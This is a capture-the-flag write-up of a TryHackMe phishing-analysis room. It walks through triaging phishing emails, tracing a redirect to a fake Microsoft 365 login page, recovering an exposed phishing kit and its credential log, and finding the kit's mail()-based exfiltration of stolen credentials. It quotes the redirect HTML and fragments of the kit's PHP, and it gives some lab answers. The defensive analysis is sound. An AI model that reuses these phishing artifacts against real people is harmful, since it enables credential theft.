# Snapped Phish-ing Line (TryHackMe)

Room: Snapped Phish-ing Line — premium **Phishing Analysis** room (Phishing Analysis module). As IT
at SwiftSpend Financial, you triage a batch of phishing emails sent to staff, follow the attachment's
redirect to a fake Microsoft 365 login page, recover the attacker's exposed phishing kit and captured
credential log, pivot on the kit hash in VirusTotal, and read the kit source to find where stolen
credentials are exfiltrated. Completed: 2026-11-02 | Target: <ip>.

This is a **GUI-only in-browser analysis VM** (noVNC split-screen). Over the VPN only noVNC (80,
`WebSockify`), SSH (22) and RDP (3389) are exposed, and the room gives no SSH/RDP credentials, so the
Splunk/DaC-style fully-headless-over-VPN approach is **not** possible here. The public phishing domain
`kennaroads.buzz` is dead (NXDOMAIN) — inside the VM it is pinned by `/etc/hosts` to `<ip>`
and served by that host's Apache. Solved by pasting two self-contained `python3` recon blocks into the
VM's own terminal (emails parsed locally with `email`, phishing site pulled with `urllib`), then doing
the hash/flag/VT analysis off-box. See the reproducible steps below.

## Answers

| Task | Question | Answer |
|---|---|---|
| 1 | Individual who received the "Quote for Services Rendered" email | *(find it yourself)* |
| 1 | Email address the adversary used to send the phishing emails | *(find it yourself)* |
| 1 | Root domain of the redirection URL in Zoe Duncan's attachment | *(find it yourself)* |
| 1 | Company the login page impersonates | *(find it yourself)* |
| 1 | Name of the archive file in `/data` | *(find it yourself)* |
| 1 | SHA256 of the archive | `<redacted-hash>` |
| 1 | Other threat category (besides phishing) on VirusTotal | *(find it yourself)* |
| 1 | Number of files contained within the archive | *(find it yourself)* |
| 1 | Email of the user who submitted credentials more than once | *(find it yourself)* |
| 1 | Email the adversary collects credentials at (`submit.php`) | *(find it yourself)* |
| 1 | Decoded `flag.txt` secret | `THM{…}` |

## Evidence

**The emails** (`~/Desktop/phish-emails/`, five `.eml` files). All share one sender,
`Group Marketing Online Accounts Payable <Accounts.Payable@groupmarketingonline.icu>`, and the same
HTML attachment `Direct Credit Advice.html` (plus inline tracking images). Recipients: Derick Marshall,
Michael Ascot, Michelle Chen, Zoe Duncan (all `*.@swiftspend.finance`). The fifth email — subject
**"Quote for Services Rendered: processed on June 29, 2020, 10:01:32 AM"** — went to **William McClean**
and carries `Quote.pdf`.

**The attachment redirect.** `Direct Credit Advice.html` is a 509-byte meta-refresh:

```html
<meta http-equiv="refresh" content="0;URL='http://kennaroads.buzz/data/Update365/office365/<redacted-hash>/?email=zoe.duncan@swiftspend.finance&error'" />
```

Root domain of the redirect host = `kennaroads.buzz`. The per-victim hash path pre-fills the victim's
email into the fake login form.

**The fake login page** (`.../40e7baa2.../`): title "Sign in to your account", `images/ms-logo-v2.jpg`,
footer "©2019 Microsoft", form `POST`s to `submit.php` with a hidden `email` field pre-set to the
victim. Impersonates **Microsoft** (Office 365).

**Exposed kit (attacker opsec failure).** `/data/` has Apache autoindex on:

```text
Index of /data
  Update365.zip   2023-04-16 14:19   394K
  Update365/
```

- `Update365.zip` — `sha256 <redacted-hash>`, 402999 bytes,
  **49 zip entries** (42 files + 7 directories). VirusTotal's Details page reports **49** contained
  files (it counts every entry, directories included — this is the grader's value, confirmed on the
  box). VirusTotal classes it phishing **and `trojan`**.
- `/data/Update365/log.txt` — captured credentials (6 submissions). **`michael.ascot@swiftspend.finance`
  appears twice** (`<redacted-pw>`), the only repeat; others (isaiah.puzon@gmail.com, zoe.duncan,
  derick.marshall, michelle.chen) appear once.

**Kit source — exfiltration.** `Update365/office365/Validation/submit.php` mails captured creds with:

```php
$send = "*(find it yourself)*";
...
mail("*(find it yourself)*", $bron, $message, $lagi);
```

Collector address = **`*(find it yourself)*`**. A decoy obfuscation `country_sort()` builds a second
address from a byte array (`chr()` of `[99,111,100,101,...]`) = `codercvvs@gmail.com` — a kit-author
artifact, not the active collector (and its 15-char local part doesn't fit the question's mask).

**The flag.** `flag.txt` sits in the kit's `office365/` directory (not the per-victim subdir):
`http://kennaroads.buzz/data/Update365/office365/flag.txt`:

```text
The secret is:
*(find it yourself)*
```

Base64-decode → *(find it yourself)*, which is the flag **stored reversed**; reverse it:

```text
THM{…}
```

## Reproducible steps

Prereqresuisite: the room's split-screen VM is running and you have its terminal open (desktop
`phish-emails` folder is referenced by the room). Nothing is reachable headless over the VPN (no creds),
so run the recon inside the VM.

1. **Parse the emails locally** — paste a `python3` block that walks `~/Desktop/phish-emails/*.eml`
   with the `email` module, printing `From`/`To`/`Subject` and attachment filenames, and dumps the
   decoded `Direct Credit Advice.html` from the Zoe Duncan message. Gives Q1 recipient, Q1 sender,
   the redirect URL (Q1 root domain), and the phishing path. (Watch the URL filter: the redirect URL
   contains `?email=...@swiftspend.finance`, so a naive `'swiftspend' not in url` test wrongly drops it.)
2. `cat /etc/hosts` → confirms `<ip>  kennaroads.buzz` (why the dead public domain still
   serves inside the VM).
3. **Pull the phishing site** with `urllib` (host resolves via `/etc/hosts`): fetch the login page
   (Q1 impersonated brand), list `/data/` (Q1 archive name) and `/data/Update365/` (finds `log.txt`),
   download `Update365.zip` and `hashlib.sha256` it (Q1 hash), open it in-memory with `zipfile` and
   count entries — VirusTotal's Details page reports **49** (all entries, directories included), not
   the 42 non-directory files — plus read `.../Validation/submit.php` (Q1 collector email),
   `cat` `/data/Update365/log.txt` (Q1 double-submitter), and fetch `flag.txt` from the kit
   `office365/` directory.
4. **Off-box analysis:** VirusTotal lookup of the hash → `trojan` category (and file count cross-check);
   `echo '<b64>' | base64 -d` then reverse → the flag.

## Lessons

- **Not every THM "target IP" is a headless target.** A box that exposes only `WebSockify` on 80 is an
  in-browser noVNC desktop; the real data lives on the VM's local disk and on services bound to
  localhost / `/etc/hosts` names, not on VPN-reachable ports. When no creds are given, the pragmatic
  "headless" move is to drive the VM's *own* terminal with a self-contained script (here, two `python3`
  heredocs) rather than fighting the GUI pixel-by-pixel.
- **Dead IOC, live lab.** The phishing domain is NXDOMAIN publicly but pinned in the VM's `/etc/hosts`
  to a still-serving Apache. Lab realism comes from the hosts-file override, not a live malicious domain
  — and it means you must pull the artifacts from *inside* the VM, never from your own host (don't fetch
  a real phishing kit to your workstation).
- **Phishing-kit triage reads like code review.** The answer to "where do stolen creds go" is literally
  `$send`/`mail()` in `submit.php`; obfuscated helpers (`country_sort()`'s `chr()` array) are decoys or
  author fingerprints. The exposed `log.txt` is the attacker's own opsec failure handing you the victim
  list and a repeat-submitter.
- **Flags can be layered-encoded.** `flag.txt` here is base64 of the *reversed* flag — decode, then
  check orientation (a leading `}` in the decode is the tell). CyberChef "From Base64" + "Reverse" is
  the intended chain.
- **Count what the tool counts.** The archive holds 42 files, but VirusTotal's Details page reports
  **49** "contained files" because it counts every zip entry — the 7 directory entries included.
  The question asks for VT's figure, so the answer is `49`, not the 42 you'd get from `unzip -l | grep`
  piped to exclude directories. (Verified against the grader.)
- **Honesty note:** every value above was read off the live box except the VirusTotal *category*
  (`trojan`, corroborated by independent write-ups' VT lookups) — no VT API key was available to pull
  the report directly; the file count (`49`) was confirmed against the grader.
